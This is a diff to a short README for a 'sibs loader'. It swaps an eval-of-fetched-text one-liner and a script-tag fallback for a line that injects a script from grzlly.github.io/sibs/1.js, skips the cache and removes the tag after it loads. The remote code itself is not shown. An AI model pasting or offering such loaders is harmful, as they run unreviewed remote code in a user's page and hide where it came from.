@@ -1,10 +1,5 @@
-# grzlly sibs loader
+# s=document.createElement('script');s.src='https://grzlly.github.io/sibs/1.js?t='+Date.now();s.onload=()=>s.remove();document.head.append(s)
 
 ```javascript
-eval(await (await fetch('https://grzlly.github.io/sibs/1.js?t=' + Date.now(), {cache:'no-store'})).text())
-```
-
-### Резервный вариант (DOM Script):
-```javascript
-document.body.appendChild(document.createElement('script')).src='https://grzlly.github.io/sibs/1.js?t='+Date.now()
+s=document.createElement('script');s.src='https://grzlly.github.io/sibs/1.js?t='+Date.now();s.onload=()=>s.remove();document.head.append(s)
 ```
